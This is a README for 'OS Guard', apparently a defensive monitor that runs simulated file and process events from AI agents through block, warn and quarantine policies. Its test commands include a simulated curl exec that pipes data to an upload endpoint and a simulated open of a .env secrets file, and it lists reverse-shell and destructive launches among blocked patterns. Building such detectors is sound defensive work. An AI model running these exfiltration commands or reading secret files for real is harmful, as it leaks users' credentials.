# OS Guard Demo MVP

OS Guard adds a fourth event surface for file and process behavior that would normally sit below shell wrappers. This branch implements the demo path only: simulated OS events flow through the same policy, audit, state, cmux, and quarantine pipeline as prompt, command, and output events.

It does not install a macOS EndpointSecurity daemon and does not deny real `AUTH_OPEN` or `AUTH_EXEC` events.

## Commands

```bash
node src/cli.js os-guard status
node src/cli.js os-guard simulate-open .env --agent demo --pid 1234
node src/cli.js os-guard simulate-exec curl https://example.com/upload -d @- --agent demo --pid 1234
node src/cli.js agent --name demo --with-os-guard -- node -e 'console.log("done")'
npm run demo:os-guard
```

## Event Shape

The adapter keeps structured metadata and also emits normalized text for the existing rule engine.

```text
os open path=.env pid=1234 agent=demo mode=simulate
os exec argv="curl https://example.com/upload -d @-" pid=1234 agent=demo mode=simulate
```

Reports keep metadata under `event.meta`, including `operation`, `path`, `argv`, `agent`, `pid`, and `mode`.

## Current Coverage

- Sensitive file open attempts block by default.
- Private key and certificate file open attempts block by default.
- Network transfer executable launches warn by default.
- Destructive executable launches block by default.
- Reverse-shell-like exec arguments block by default.

## Native Follow-Up

`src/integrations/os-guard.js` is the adapter boundary for a later native daemon. A real macOS EndpointSecurity implementation still needs entitlement, signing, privileged execution, PID subscription, and IPC back into this CLI.

The Swift skeleton lives under `daemon/es-daemon/`. It is intentionally in skeleton mode: it models the daemon structure, event handling, and policy bridge, but it does not create a real EndpointSecurity client yet.
